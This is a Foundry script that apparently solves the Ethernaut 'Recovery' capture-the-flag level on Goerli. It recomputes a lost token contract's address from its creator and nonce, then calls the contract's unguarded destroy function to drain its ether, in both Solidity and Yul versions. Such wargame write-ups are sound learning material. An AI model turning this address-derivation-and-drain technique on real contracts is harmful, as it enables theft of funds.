// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}

interface SimpleToken {
    function name() external view returns (string memory);

    function balances(address) external view returns (uint);

    function destroy(address payable _to) external;
}

contract RecoveryScript is EthernautScript {
    string network = "goerli";
    address level = 0xb4B157C7c4b0921065Dded675dFe10759EecaA6D;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0.001 ether));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        uint8 nonce = 1;
        SimpleToken simpleToken = SimpleToken(
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), nonce)))))
        );
        simpleToken.destroy(payable(player));
        require(address(simpleToken).balance == 0);
    }

    function yulVersion() internal {
        assembly {
            let nonce := 1
            mstore(0, sload(instance.slot))
            mstore8(10, 0xd6)
            mstore8(11, 0x94)
            mstore8(32, nonce)
            mstore(0, keccak256(10, 23))
            let addressMask := sub(exp(2, 160), 1)
            let simpleToken := and(mload(0), addressMask)

            mstore(0, "destroy(address)")
            mstore(0, keccak256(0, 16))
            mstore(4, sload(player.slot))
            let success := call(gas(), simpleToken, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
            if balance(simpleToken) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
